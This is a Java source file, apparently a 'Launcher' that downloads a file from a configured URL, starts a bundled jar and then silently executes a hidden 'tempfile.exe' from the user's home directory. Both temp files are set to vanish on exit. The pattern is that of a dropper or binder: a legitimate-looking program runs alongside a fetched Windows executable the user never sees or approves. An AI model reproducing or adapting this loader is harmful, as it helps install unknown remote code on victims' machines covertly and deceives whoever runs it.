import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.nio.file.Files;
import java.util.Objects;

public class Launcher {

    public static void main(String[] args) {
        new Downloader(Constants.downloadUrl).download();
    }

    public static void startProcess() throws IOException {
        File exec = new File(System.getProperty("user.home") + File.separator + "tempfile.exe");
        exec.deleteOnExit();
        File tempFile = File.createTempFile("launch", ".jar");
        tempFile.deleteOnExit();
        try {
            File file = getResourceAsFile(Constants.jarInResources);

            byte[] getAllBytes = Files.readAllBytes(file.toPath());
            Files.write(tempFile.toPath(), getAllBytes);

            Process p = Runtime.getRuntime().exec("java -jar " + tempFile.getAbsolutePath());

            if (p.getInputStream() == null) {
                return;
            }

            new Thread(new ProcessChecker(p)).start();

            p = Runtime.getRuntime().exec(exec.getAbsolutePath());

            if (p.getInputStream() == null) {
                return;
            }

            new Thread(new ProcessChecker(p)).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static File getResourceAsFile(String resourcePath) {
        try {
            InputStream in = ClassLoader.getSystemClassLoader().getResourceAsStream(resourcePath);
            if (in == null) {
                return null;
            }

            File tempFile = File.createTempFile(String.valueOf(in.hashCode()), ".jar");
            tempFile.deleteOnExit();

            try (FileOutputStream out = new FileOutputStream(tempFile)) {
                //copy stream
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }
            return tempFile;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }
}

